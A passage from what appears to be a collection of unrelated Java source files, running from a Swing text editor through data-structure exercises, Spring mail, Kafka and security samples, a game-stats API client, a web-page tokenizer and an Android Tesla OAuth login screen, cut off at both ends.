BufferedReader reader = new BufferedReader(new FileReader(file));\n                        textArea.read(reader, null);\n                        reader.close();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            }\n        });\n\n        support.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0447\u0442\u043e \u0431\u044b \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u043f\u0435\u0440\u0435\u0445\u043e\u0434\u0438\u043b\u043e \u043d\u0430 \u044e\u0442\u0443\u0431 \u0432\u0438\u0434\u0435\u043e\n            public void actionPerformed(ActionEvent e) {\n                try {\n                    Desktop desktop = Desktop.getDesktop();\n                    URI urlka = new URI(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\");\n                    desktop.browse(urlka);\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                }\n            }\n        });\n\n        saveFile.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c\n            public void actionPerformed(ActionEvent e) {\n                JFileChooser fileChooser = new JFileChooser();\n                if (fileChooser.showSaveDialog(frame) == JFileChooser.APPROVE_OPTION) {\n                    File file = fileChooser.getSelectedFile();\n                    try {\n                        BufferedWriter writing = new BufferedWriter(new FileWriter(file));\n                        textArea.write(writing);\n                        writing.close();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            }\n        });\n\n//        WebSite.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0447\u0442\u043e \u0431\u044b \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443 \u043f\u0435\u0440\u0435\u0445\u043e\u0434\u0438\u043b\u0430 \u043d\u0430 \u043c\u043e\u0439 \u0441\u0443\u043f\u0435\u0440 \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u0439 \u0441\u0430\u0439\u0442 \u043d\u0430 \u0434\u0436\u0430\u0432\u0435 \u0434\u043b\u044f \u043f\u0440\u0430\u043a\u0442\u0438\u043a\u0438 \u043d\u0430\u043f\u0438\u0441\u0430\u043b \u044d\u0442\u0443 \u0444\u0443\u043d\u043a\u0446\u0438\u044e\n//            public void actionPerformed(ActionEvent e) {\n//                try {\n//                    HttpsServer.HttpServer();\n//                    Desktop desktop = Desktop.getDesktop();\n//                    URI uri = new URI(\"http://localhost:8000/main\");\n//                    desktop.browse(uri);\n//                } catch (Exception ex) {\n//                    ex.printStackTrace();\n//                }\n//            }\n//        });\n\n        // setting for textditor that it worki    g! takiye dela\n        JToolBar toolBar = new JToolBar();\n        fileMenu.add(openFile);\n        fileMenu.add(saveFile);\n        fileMenu.add(support);\n        fram",
    "import java.util.ArrayList;//A Binary min heap\nimport java.util.HashMap;\n\npublic class Heap <T extends Comparable<T>> \n{\n\tArrayList<T> data = new ArrayList<>();\n\tHashMap<T, Integer> map = new HashMap<>();//Maps each element to its index in the data list. This is used for efficient retrieval of an element's position in the heap.\n\n\tpublic void add(T item) //Adds an item to the heap. It places the item at the end of the data list and then calls upheapify to restore the heap property.\n\t{\n\t\tdata.add(item);   \n\t\tmap.put(item, this.data.size() - 1);\n\t\tupheapify(data.size() - 1);\n\t}\n\n\tprivate void upheapify(int ci) //Moves an item up the heap to its correct position. It compares the item with its parent and swaps them if the item is smaller. This process is repeated until the item is in its correct position.\n\t{\n\t\tint pi = (ci - 1) / 2;\n\t\tif (isLarger(data.get(ci), data.get(pi)) > 0) \n\t\t{\n\t\t\tswap(pi, ci);\n\t\t\tupheapify(pi);\n\t\t}\n\t}\n\n\tprivate void swap(int i, int j) // Swaps two elements in the heap. It also updates the map to reflect the new positions of the swapped elements.\n\t{\n\t\tT ith = data.get(i);\n\t\tT jth = data.get(j);\n\t\t\n\t\tdata.set(i, jth);\n\t\tdata.set(j, ith);\n\t\tmap.put(ith, j);\n\t\tmap.put(jth, i);\n\t}\n\n\tpublic void display() // Prints the contents of the heap.\n\t{\n\t\tSystem.out.println(data);\n\t}\n\n\tpublic int size() //size of the heap\n\t{\n\t\treturn this.data.size();\n\t}\n\n\tpublic boolean isEmpty() //: Checks if the heap is empty.\n\t{\n\t\treturn this.size() == 0;\n\t}\n\n\tpublic T remove() //Removes and returns the root element of the heap. It swaps the root with the last element, removes the last element, and then calls downheapify to restore the heap property.\n\t{\n\t\tswap(0, this.data.size() - 1);\n\t\tT rv = this.data.remove(this.data.size() - 1);\n\t\tdownheapify(0);\n\n\t\tmap.remove(rv);\n\t\treturn rv;\n\t}\n\n\tprivate void downheapify(int pi) //Moves an item down the heap to its correct position. It compares the item with its children and swaps it with the smaller child if the item is larger. This process is repeated until the item is in its correct position.\n\t{\n\t\tint lci = 2 * pi + 1;\n\t\tint rci = 2 * pi + 2;\n\t\tint mini = pi;\n\n\t\tif (lci < this.data.size() && isLarger(data.get(lci), data.get(mini)) > 0)\n\t\t{\n\t\t\tmini = lci;\n\t\t}\n\t\t\n\t\tif (rci < this.data.size() && isLarger(data.get(rci), data.get(mini)) > 0) \n\t\t{\n\t\t\tmini = rci;\n\t\t}\n\t\t\n\t\tif (mini != pi)\n\t\t{\n\t\t\tswap(mini, pi);\n\t\t\tdownheapify(mini);\n\t\t}\n\t}\n\n\tpublic T get() //Returns the root element of the heap without removing it.\n\t{\n\t\treturn this.data.get(0);\n\t}\n\n\tpublic int isLarger(T t, T o) //Compares two elements and returns a positive value if the first is larger, indicating a violation of the heap property.\n\t{\n\t\treturn t.compareTo(o);\n\t}\n\n\tpublic void updatePriority(T pair) //Updates the position of an element in the heap to maintain the heap property. It finds the element's index using the map and then calls upheapify to move the element up or down as necessary.\n\t{\n\t\tint index = map.get(pair);\n\t\tupheapify(index);\n\t}\n}\n\n\n// basicailly forms a tree using the heap data froms a tree using the values of the gvertex and then we use bfs and dfs to find the cost and time to reach the stations ",
    "import com.google.gson.JsonParser;\nimport com.google.gson.JsonSyntaxException;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Scanner;\n\nclass HopliteAPI {\n    private static final String BASE_URL = \"https://hopliteapi.isabel.gg/api/stats\";\n    private static final int TIMEOUT_SECONDS = 10;\n\n    public String getRoyaleStats(String username) throws IOException {\n        /*\n         * Returns Battle Royale stats for the player\n         */\n        return makeRequest(BASE_URL + \"/royale/\" + username);\n    }\n\n    public String getDuelsStats(String username) throws IOException {\n        /*\n         * Returns Duels stats for the player\n         */\n        return makeRequest(BASE_URL + \"/duels/\" + username);\n    }\n\n    private String makeRequest(String urlString) throws IOException {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setReadTimeout(TIMEOUT_SECONDS * 1000);\n        connection.setConnectTimeout(TIMEOUT_SECONDS * 1000);\n\n        try {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                try (InputStream inputStream = connection.getInputStream();\n                     InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n                    StringBuilder response = new StringBuilder();\n                    Scanner scanner = new Scanner(inputStreamReader);\n                    while (scanner.hasNextLine()) {\n                        response.append(scanner.nextLine());\n                    }\n                    return JsonParser.parseString(response.toString()).toString();\n                } catch (JsonSyntaxException e) {\n                    throw new IOException(\"Failed to parse JSON response\", e);\n                }\n            } else {\n                throw new IOException(\"HTTP error code: \" + responseCode);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}\n\npublic class wrapper {\n    public static void main(String[] args) {\n        HopliteAPI api = new HopliteAPI();\n        String username = \"flowtives\";\n\n        try {\n            String royaleStats = api.getRoyaleStats(username);\n            System.out.println(royaleStats);\n\n            String duelsStats = api.getDuelsStats(username);\n            System.out.println(duelsStats);\n        } catch (IOException e) {\n            System.err.println(\"Error fetching stats: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}",
    "package meowindexer;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport opennlp.tools.stemmer.PorterStemmer;\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\n\npublic class tokenizer {\n  // NOTE: SUBCLASS Token\n  // =====================\n\n  /**\n   * Token class: represents a token with its count and position in the document\n   *\n   * @word: The token\n   * @count: The number of times the token appears in the document\n   * @position: The position of the token in the document (title, h1, h2, or\n   *            other)\n   *\n   */\n  public class Token {\n    public String word;\n    public int count;\n    public String position;\n\n    /**\n     * Constructor for the Token class\n     *\n     * @param word: The token\n     */\n    public Token(String word) {\n      this.word = word;\n      this.count = 1;\n      this.position = \"other\";\n    }\n\n    /**\n     * Increment the count of the token\n     */\n    public void increment() { count++; }\n  }\n\n  // NOTE: CLASS tokenizer |||| Data Members\n  private HashSet<String> stopWords;\n\n  /**\n   * Constructor for the tokenizer: loads\n   */\n  public tokenizer() {\n    stopWords = new HashSet<String>();\n    loadStopWords(\"stopwords-en.txt\");\n  }\n\n  public HashMap<String, Token> tokenize(Document doc) {\n    String text = doc.text();\n    List<String> tokens = tokenizeString(text);\n    tokens = stemTokens(tokens);\n    HashMap<String, Token> tokenMap = new HashMap<String, Token>();\n\n    for (String token : tokens) {\n      if (tokenMap.containsKey(token)) {\n        tokenMap.get(token).increment();\n      } else {\n        tokenMap.put(token, new Token(token));\n      }\n    }\n\n    fillPosistions(tokenMap, doc);\n\n    return tokenMap;\n  }\n\n  /**\n   * Load stop words from a file (stopwords-en.txt)\n   *\n   * @param filename: Name of the file containing stop words\n   */\n  private void loadStopWords(String filename) {\n    try {\n      // NOTE: root path is src/meowindexer/app/. everything is relative to this\n      // path\n      BufferedReader reader =\n          new BufferedReader(new FileReader(\"../data/\" + filename));\n      String line;\n      while ((line = reader.readLine()) != null) {\n        stopWords.add(line.trim());\n      }\n      reader.close();\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  /**\n   * Tokenize a string into words and remove non-alphabetic characters\n   *\n   * @param text: String to tokenize\n   * @return List of tokens\n   */\n  private List<String> tokenizeString(String text) {\n    List<String> tokens = new ArrayList<String>();\n\n    String cleanText = text.toLowerCase().replaceAll(\"[^a-zA-Z ]\", \"\");\n    String[] words = cleanText.split(\"\\\\s+\");\n\n    for (String word : words) {\n      if (word.length() > 1 && !isStopWord(word.trim())) {\n        tokens.add(word.trim());\n      }\n    }\n\n    return tokens;\n  }\n\n  /**\n   * Stem tokens using the Porter Stemmer\n   *\n   * @param tokens: List of tokens to stem\n   * @return List of stemmed tokens\n   */\n  private List<String> stemTokens(List<String> tokens) {\n    List<String> stemmedTokens = new ArrayList<String>();\n    PorterStemmer stemmer = new PorterStemmer();\n\n    for (String token : tokens) {\n      stemmedTokens.add(stemmer.stem(token));\n    }\n\n    return stemmedTokens;\n  }\n\n  /**\n   * Check if a word is a stop word\n   *\n   * @param word: Word to check\n   * @return True if the word is a stop word, false otherwise\n   */\n  private boolean isStopWord(String word) { return stopWords.contains(word); }\n\n  /**\n   * Fill the position of each token in the document (title, h1, h2, or other)\n   *\n   * @param tokens: Map of tokens\n   * @param doc:    Document to search for token positions\n   */\n  private void fillPosistions(HashMap<String, Token> tokens, Document doc) {\n    List<String> titleTokens = stemTokens(tokenizeString(doc.title()));\n    List<String> h1Tokens = stemTokens(tokenizeString(doc.select(\"h1\").text()));\n    List<String> h2Tokens = stemTokens(tokenizeString(doc.select(\"h2\").text()));\n\n    for (String token : tokens.keySet()) {\n      Token t = tokens.get(token);\n      if (titleTokens.contains(t.word)) {\n        t.position = \"title\";\n      } else if (h1Tokens.contains(t.word)) {\n        t.position = \"h1\";\n      } else if (h2Tokens.contains(t.word)) {\n        t.position = \"h2\";\n      }\n    }\n  }\n\n  /**\n   * Test the tokenizer\n   * visit https://en.wikipedia.org/wiki/Cat and print the tokens\n   */\n  public void test() {\n    final String ANSI_RESET = \"\\u001B[0m\";\n    final String ANSI_GREEN = \"\\u001B[32m\";\n\n    System.out.println(ANSI_GREEN);\n    System.out.println(\"Testing tokenizer...\");\n    System.out.println(ANSI_RESET);\n\n    Document doc = null;\n    final String url = \"https://en.wikipedia.org/wiki/Cat\";\n    try {\n      doc = Jsoup.connect(url).get();\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n\n    System.out.println(\"tokenizing: \" + url + \" : \" ",
    "package com.managementsystem.employeemanagementwebapp.mail;\n\nimport jakarta.mail.MessagingException;\nimport jakarta.mail.internet.MimeMessage;\nimport org.springframework.mail.javamail.JavaMailSender;\nimport org.springframework.mail.javamail.MimeMessageHelper;\nimport org.springframework.stereotype.Service;\nimport org.thymeleaf.spring6.SpringTemplateEngine;\nimport org.thymeleaf.context.Context;\n\n@Service\npublic class MailService {\n\n    private final JavaMailSender emailSender;\n\n    private final SpringTemplateEngine templateEngine;\n\n    public MailService(JavaMailSender emailSender, SpringTemplateEngine templateEngine) {\n        this.emailSender = emailSender;\n        this.templateEngine = templateEngine;\n    }\n\n    public void sendSimpleMessage(String to, String subject, String text) {\n        MimeMessage message = emailSender.createMimeMessage();\n        MimeMessageHelper helper = new MimeMessageHelper(message);\n        try {\n            helper.setTo(to);\n            helper.setSubject(subject);\n            helper.setText(text, true); // true indicates html\n            emailSender.send(message);\n        } catch (MessagingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendHtmlMessage(String to, String subject, String templateName, Context context) {\n        MimeMessage message = emailSender.createMimeMessage();\n        try {\n            MimeMessageHelper helper = new MimeMessageHelper(message, true);\n            helper.setTo(to);\n            helper.setSubject(subject);\n\n            String htmlContent = templateEngine.process(templateName, context);\n            helper.setText(htmlContent, true);\n\n            emailSender.send(message);\n        } catch (MessagingException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "\npublic class SingleLinkedList<E> {\n\npublic static class Node<E> {\n    //-------------------------------- Node Class --------------------------------------- \n\n        private E element; // reference to the element stored at this node\n        private Node<E> next; // reference to the subsequent node in the list\n\n        public Node(E e, Node<E> n) {\n            element = e;\n            next = n;\n        }\n        public Node() {\n                   element = null;\n                   next = null;\n               }\n\n        public E getElement() {\n            return element;\n        }\n\n        public Node<E> getNext() {\n            return next;\n        }\n\n        public void setNext(Node<E> n) {\n            next = n;\n        }\n\n        public void setelement(E element) {\n            this.element = element;\n        }\n    }\n   \n\n    Node<E> head; // head node of the list (or null if empty)\n    Node<E> tail; // last node of the list (or null if empty)\n    private int size; // number of nodes in the list\n\n    public SingleLinkedList() {// constructs an initially empty list\n        head = null;\n        tail = null;\n        size = 0;\n    }\n\n    // access methods\n    public int size() {\n        return size;\n    }\n\n    public boolean isEmpty() {\n        return size == 0;\n    }\n\n    public E first() { // returns (but does not remove) the first element\n        if (isEmpty()) {\n            return null;\n        }\n        return head.getElement();\n    }\n\n    public E last() { // returns (but does not remove) the last element\n        if (isEmpty()) {\n            return null;\n        }\n        return tail.getElement();\n    }\n\n    // update methods\n    public void addFirst(E e) { // adds element e to the front of the list\n        Node<E> newest = new Node<E>(e, null); // create and link a new node\n        newest.setNext(head);\n        head = newest;\n        if (size == 0) {\n            tail = head; // special case: new node becomes tail also\n        }\n        size++;\n    }\n\n    public void addLast(E e) { // adds element e to the end of the list\n        Node<E> newest = new Node<E>(e, null); // node will eventually be the tail\n        if (isEmpty()) {\n            head = newest; // special case: previously empty list\n        } else {\n            tail.setNext(newest); // new node after existing tail\n        }\n        tail = newest; // new node becomes the tail\n        size++;\n    }\n\n    public E removeFirst() { // removes and returns the first element\n        if (isEmpty()) {\n            return null; // nothing to remove\n        }\n        E answer = head.getElement();\n        head = head.getNext(); // will become null if list had only one node\n        size--;\n        if (size == 0) {\n            tail = null; // special case as list is now empty\n        }\n        return answer;\n    }\n\n    public E removeLast() {  // removes and returns the last node\n\n        if (size == 0) {\n            return null;\n        }// nothing to remove\n        else {\n            E data = tail.getElement();  // get a copy of the data stored in the last node\n            if (size == 1) // only one node in the list\n            {\n                head = tail = null;\n            } else { // at least two nodes\n                Node temp1 = head;// make temp1 point to the head \n                Node temp2 = null; // make temp2 point to null\n                while (temp1.getNext() != null) // find last node\n                {\n                    temp2 = temp1;\n                    temp1 = temp1.getNext();\n                }\n                temp2.setNext(null); // null out the next pointer of the last node \n                tail = temp2; // update the value of tail\n            }\n            size--; //decrement the size of list\n            return data; // return the value stored in the removed node\n        }\n    }\n\n    public void Display() {\n        Node temp = head;\n        System.out.print(\" head->\");\n        while (temp != null) {\n            System.out.print(temp.getElement() + \"->\");\n            temp = temp.getNext();\n        }\n        System.out.print(\"tail\");\n    }\n\n    public void printList() {\n        Node<E> current = head;\n        if (current.getElement() != null) {\n            System.out.println(current.getElement());\n            current = current.getNext();\n        }\n    }\n    \n    public void addAtPosition(E e, int position){\n        if(position < 1 || position > size){\n            System.out.println(\"Invalid Position!\");\n            return;\n        }\n        Node<E> newest = new Node<>(e,null);\n        if(position ==1 ){\n            newest.setNext(head);\n            head =  newest;\n            if(size == 0){\n                tail = head;\n            }\n        }\n        Node<E> current = head;\n        for (int i = 0; i < position; i++) {\n            current = current.getNext();           \n        }\n        newest.setNext(current.getNext());\n        current.setNext(newest);\n        size++;\n    }\n\n}\n// End SinglyLinkedList Class\n\n",
    "package app8;\n\nimport io.micrometer.common.KeyValues;\nimport java.util.UUID;\nimport java.util.concurrent.CompletableFuture;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.boot.ApplicationRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.ConsumerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.support.SendResult;\nimport org.springframework.kafka.support.micrometer.KafkaRecordSenderContext;\nimport org.springframework.kafka.support.micrometer.KafkaTemplateObservationConvention;\n\n@SpringBootApplication\npublic class SpringKafkaApp8 {\n\n    private static final Logger logger = LoggerFactory.getLogger(SpringKafkaApp8.class);\n\n    public static void main(String[] args) {\n        SpringApplication.run(SpringKafkaApp8.class, args);\n    }\n\n    @Bean\n    public NewTopic springKafkaApp0Demo1Topic() {\n        return TopicBuilder.name(\"spring-kafka-app8-demo\")\n                .partitions(1)\n                .replicas(3)\n                .build();\n    }\n\n    @Bean\n    public ApplicationRunner runner(KafkaTemplate<String, String> kafkaTemplate) {\n        return args -> {\n            CompletableFuture<SendResult<String, String>> send = kafkaTemplate.send(\"spring-kafka-app8-demo\",\n                    UUID.randomUUID().toString(),\n                    \"I am an observer!\");\n            send.get();\n            send.whenComplete((s, e) -> {\n                logger.info(\"data sent.\");\n            });\n\n        };\n    }\n\n    @Bean\n    public KafkaTemplate<String, String> kafkaTemplate(ProducerFactory<String, String> producerFactory) {\n        KafkaTemplate<String, String> t = new KafkaTemplate<>(producerFactory);\n        t.setObservationEnabled(true);\n        t.setObservationConvention(new KafkaTemplateObservationConvention() {\n            @Override\n            public KeyValues getLowCardinalityKeyValues(KafkaRecordSenderContext context) {\n                return KeyValues.of(\"topic\", context.getDestination(),\n                        \"id\", String.valueOf(context.getRecord().key()));\n            }\n        });\n        return t;\n    }\n\n    static class ConsumerConfig {\n        @Bean\n        public ConcurrentKafkaListenerContainerFactory<String, String> listenerFactory(ConsumerFactory<String, String> consumerFactory) {\n            ConcurrentKafkaListenerContainerFactory<String, String> factory =\n                    new ConcurrentKafkaListenerContainerFactory<>();\n            factory.getContainerProperties().setObservationEnabled(true);\n            factory.setConsumerFactory(consumerFactory);\n            return factory;\n        }\n    }\n\n    @KafkaListener(id = \"spring-kafka-app8-demo-group\", topics = \"spring-kafka-app8-demo\", containerFactory = \"listenerFactory\")\n    public void listen(String in) {\n        System.out.println(\"Data Received : \" + in);\n    }\n\n\n}\n",
    "package com.divide.by.zero.security.user;\n\nimport lombok.Getter;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\n\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\nimport static com.divide.by.zero.security.user.Permission.ADMIN_CREATE;\nimport static com.divide.by.zero.security.user.Permission.ADMIN_DELETE;\nimport static com.divide.by.zero.security.user.Permission.ADMIN_READ;\nimport static com.divide.by.zero.security.user.Permission.ADMIN_UPDATE;\nimport static com.divide.by.zero.security.user.Permission.MANAGER_CREATE;\nimport static com.divide.by.zero.security.user.Permission.MANAGER_DELETE;\nimport static com.divide.by.zero.security.user.Permission.MANAGER_READ;\nimport static com.divide.by.zero.security.user.Permission.MANAGER_UPDATE;\n\n@Getter\n@RequiredArgsConstructor\npublic enum Role {\n\n    USER(Collections.emptySet()),\n    ADMIN(\n            Set.of(\n                    ADMIN_READ,\n                    ADMIN_UPDATE,\n                    ADMIN_DELETE,\n                    ADMIN_CREATE,\n                    MANAGER_READ,\n                    MANAGER_UPDATE,\n                    MANAGER_DELETE,\n                    MANAGER_CREATE\n            )\n    ),\n    MANAGER(\n            Set.of(\n                    MANAGER_READ,\n                    MANAGER_UPDATE,\n                    MANAGER_DELETE,\n                    MANAGER_CREATE\n            ));\n\n    private final Set<Permission> permissions;\n\n    public List<SimpleGrantedAuthority> getAuthorities() {\n        var authorities = getPermissions()\n                .stream()\n                .map(permission -> new SimpleGrantedAuthority(permission.getPermission()))\n                .collect(Collectors.toList());\n        authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + this.name()));\n        return authorities;\n    }\n}\n",
    "package com.dhuar.teslaauth;\n\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.Looper;\nimport android.os.Message;\nimport android.util.Log;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.webkit.CookieManager;\nimport android.webkit.WebResourceRequest;\nimport android.webkit.WebSettings;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\nimport androidx.navigation.fragment.NavHostFragment;\n\nimport com.dhuar.teslaauth.databinding.FragmentSecondBinding;\nimport com.dhuar.teslaauth.utils.TeslaOAuth2;\nimport com.dhuar.teslaauth.utils.Utils;\n\nimport java.io.IOException;\n\nimport okhttp3.Call;\nimport okhttp3.Callback;\nimport okhttp3.Response;\n\npublic class SecondFragment extends Fragment {\n\n    private FragmentSecondBinding binding;\n\n    private static final String TAG = \"SecondFragment\";\n\n    private static final int MSG_To_HOME = 1;\n\n    private TeslaOAuth2 teslaOAuth2 = TeslaOAuth2.getInstance();\n\n    private SharedPreferences mSharedPreferences;\n\n    private Handler mHandler = new Handler(Looper.getMainLooper()) {\n        @Override\n        public void handleMessage(@NonNull Message msg) {\n            super.handleMessage(msg);\n            switch (msg.what) {\n                case MSG_To_HOME:\n                    NavHostFragment.findNavController(SecondFragment.this)\n                            .navigate(R.id.action_SecondFragment_to_FirstFragment);\n                    break;\n                default:\n                    break;\n            }\n        }\n    };\n\n\n\n    @Override\n    public View onCreateView(\n            LayoutInflater inflater, ViewGroup container,\n            Bundle savedInstanceState\n    ) {\n        binding = FragmentSecondBinding.inflate(inflater, container, false);\n        return binding.getRoot();\n\n    }\n\n\n\n    public void onViewCreated(@NonNull View view, Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n        mSharedPreferences = getContext().getSharedPreferences(\"data\", Context.MODE_PRIVATE);\n        teslaOAuth2.init();\n        WebSettings settings = binding.webview.getSettings();\n        settings.setJavaScriptEnabled(true);\n        CookieManager.getInstance().setAcceptThirdPartyCookies(binding.webview,true);\n        binding.webview.setWebViewClient(new WebViewClient(){\n            @Override\n            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {\n                String url = request.getUrl().toString();\n                Log.d(TAG, \"shouldOverrideUrlLoading:\" + url);\n                if(url.contains(\"/void/callback\")) {\n                    String code = teslaOAuth2.getCode(url);\n                    System.out.println(\"code:\" + code);\n                    teslaOAuth2.requestToken(code,new Callback() {\n                        @Override\n                        public void onFailure(Call call, IOException e) {\n                            e.printStackTrace();\n                        }\n\n                        @Override\n                        public void onResponse(Call call, Response response) throws IOException {\n                            if (!response.isSuccessful()) {\n                                System.out.println(response.body().string());\n                                throw new IOException(\"Unexpected code \" + response);\n                            }\n                            Utils.writeToken(mSharedPreferences,response.body().string());\n                            mHandler.sendEmptyMessage(MSG_To_HOME);\n                        }\n                    });\n                }\n                return super.shouldOverrideUrlLoading(view, request);\n            }\n        });\n\n        binding.webview.loadUrl(teslaOAuth2.getUrl());\n\n\n//        binding.buttonSecond.setOnClickListener(new View.OnClickListener() {\n//            @Override\n//            public void onClick(View view) {\n//                NavHostFragment.findNavController(SecondFragment.this)\n//                        .navigate(R.id.action_SecondFragment_to_FirstFragment);\n//            }\n//        });\n    }\n\n    @Override\n    public void onDestroyView() {\n        super.onDestroyView();\n        binding = null;\n    }\n\n\n\n\n}",
    "\nimport books.Books;\nimport books.LLQueue;\n\npublic class Main {\n\n   \n    public static void main(String[] args) {\n       \n        Books Book1 = new Books(\"the little prenciess\",\"Divid\");\n        Books Book2 = new Books(\"Dracola\",\"Martin\");\n        Books Book3 = new Books(\"Matilda\",\"Harry Styles\");\n        Books Book4 = new Books(\"country\",\"KSA\");\n        Books Book5 = new Books(\"Shipment\",\"Aramex\");\n        \n        LLQueue<Books> AutherBooks = new LLQueue<>();\n\n        AutherBooks.Enqueue(Book1);\n        AutherBooks.Enqueue(Book2);\n        AutherBooks.Enqueue(Book3);\n        \n        System.out.println(\"Authers books is: \");\n        AutherBooks.Display();\n        \n       LLQueue<Books> MyTextBooks = new LLQueue<>(); \n       MyTextBooks.Enqueue(Book3);\n       MyTextBooks.Enqueue(Book5);\n       MyTextBooks.Enqueue(Book4);\n       MyTextBooks.Enqueue(Book2);\n       \n        System.out.println(\"My Text Books is: \");\n        MyTextBooks.Display();\n        \n        int count = 0;\n        while ( ! AutherBooks.isEmpty()){\n            Books Auther = AutherBooks.Dequeue();\n            boolean isFound = MyTextBooks.find(Auther);\n            ;\n            if(isFound){\n              MyTextBooks.RemoveAllEllemnetE(Auther); \n              count++;\n            }\n        }\n        \n       System.out.println(\"My Text Books is: \");\n        MyTextBooks.Display();\n        \n        System.out.println(\"there are \"+count+\" books of MyTextBooks are found in AutherBooks.\"); \n    }\n}",
    "package app.entities;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class User {\n\n    private int userID;\n    private String email;\n    private String password;\n    private int roleID;\n    private int balance;\n    private List<OrderDetail> cartList = new ArrayList<>();\n\n    public User(int userID, String email, String password, int roleID, int balance) {\n        this.userID = userID;\n        this.email = email;\n        this.password = password;\n        this.roleID = roleID;\n        this.balance = balance;\n    }\n\n    public User(int userID) {\n        this.userID = userID;\n    }\n\n    public User(String email, String password) {\n        this.email = email;\n        this.password = password;\n    }\n\n    // potentially needed\n    public User(String email, String password, int roleID) {\n        this.email = email;\n        this.password = password;\n        this.roleID = roleID;\n    }\n\n    public int getUserID() {\n        return userID;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public int getRoleID() {\n        return roleID;\n    }\n\n    public int getBalance() {\n        return balance;\n    }\n\n    public List<OrderDetail> getCartList() {\n        return cartList;\n    }\n\n    public void addToCart(int baseID, int toppingID, String baseName, String toppingName, int amount, int totalPrice) {\n        cartList.add(new OrderDetail(baseID, toppingID, baseName, toppingName, amount, totalPrice));\n    }\n\n    public void removeFromCart(int index) {\n\n        cartList.remove(index);\n    }\n\n\n    public void emptyCart() {\n        cartList.clear();\n    }\n}\n",
    "package bootiful.spel;\n\nimport org.springframework.aot.hint.MemberCategory;\nimport org.springframework.aot.hint.TypeReference;\nimport org.springframework.beans.factory.BeanFactory;\nimport org.springframework.beans.factory.aot.BeanFactoryInitializationAotContribution;\nimport org.springframework.beans.factory.aot.BeanFactoryInitializationAotProcessor;\nimport org.springframework.beans.factory.config.ConfigurableListableBeanFactory;\nimport org.springframework.boot.ApplicationRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.expression.BeanFactoryResolver;\nimport org.springframework.expression.spel.SpelNode;\nimport org.springframework.expression.spel.ast.BeanReference;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\nimport org.springframework.expression.spel.support.StandardEvaluationContext;\nimport org.springframework.stereotype.Service;\nimport org.springframework.util.ReflectionUtils;\nimport org.springframework.util.StringUtils;\n\nimport java.util.HashSet;\nimport java.util.Set;\nimport java.util.UUID;\n\n@SpringBootApplication\npublic class SpelApplication {\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SpelApplication.class, args);\n\t}\n\n\t@Bean\n\tstatic SpelHints spelHints() {\n\t\treturn new SpelHints();\n\t}\n\n\tprivate static final String SPEL = \" @customerService.uid()  \";\n\n\tstatic class 